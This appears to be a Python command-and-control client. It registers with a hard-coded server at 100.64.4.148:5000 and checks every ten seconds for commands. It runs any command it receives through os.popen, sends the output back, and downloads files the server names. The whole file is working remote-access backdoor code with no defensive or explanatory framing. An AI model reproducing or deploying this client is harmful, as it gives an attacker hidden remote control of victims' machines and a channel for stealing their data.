# c2_client.py
import requests
import time
import os
import uuid

SERVER_URL = "http://100.64.4.148:5000"
CLIENT_ID = str(uuid.uuid4())  # Generate a unique client ID for each client

def register_client():
    try:
        response = requests.post(f"{SERVER_URL}/register_client", json={'client_id': CLIENT_ID})
        if response.status_code == 200:
            print(f"Client {CLIENT_ID} registered successfully.")
        else:
            print(f"Failed to register client. Status Code: {response.status_code}")
    except Exception as e:
        print(f"Error registering client: {e}")


def download_file(file_name):
    """
    Downloads a file from the server and saves it locally.
    """
    try:
        response = requests.get(f"{SERVER_URL}/download/{file_name}")
        if response.status_code == 200:
            with open(file_name, 'wb') as f:
                f.write(response.content)
            print(f"File '{file_name}' downloaded successfully.")
        else:
            print(f"Error: File not found. Status Code: {response.status_code}")
    except Exception as e:
        print(f"Error downloading file: {e}")

def get_command():
    try:
        response = requests.get(f"{SERVER_URL}/command/{CLIENT_ID}")
        command = response.json().get('command', '')
        return command
    except Exception as e:
        print(f"Error fetching command: {e}")
        return ""

def send_result(result):
    try:
        response = requests.post(f"{SERVER_URL}/result/{CLIENT_ID}", json={'result': result})
        return response.json().get('status', '')
    except Exception as e:
        print(f"Error sending result: {e}")

def execute_command(command):
    if command == "":
        return "No command received."
    elif command.startswith("download"):
        _, file_name = command.split(" ", 1)
        print(f"Received command to download '{file_name}' from the server.")
        download_file(file_name)
    else:
    	try:
        	output = os.popen(command).read()
        	return output if output else "Command executed with no output."
    	except Exception as e:
        	return f"Error executing command: {e}"

if __name__ == "__main__":
    print(f"Client ID: {CLIENT_ID}")
    register_client()  # Register the client on startup

    while True:
        command = get_command()
        if command:
            print(f"Received command: {command}")
            result = execute_command(command)
            print(f"Command result: {result}")
            send_result(result)
        time.sleep(10)  # Check every 10 seconds
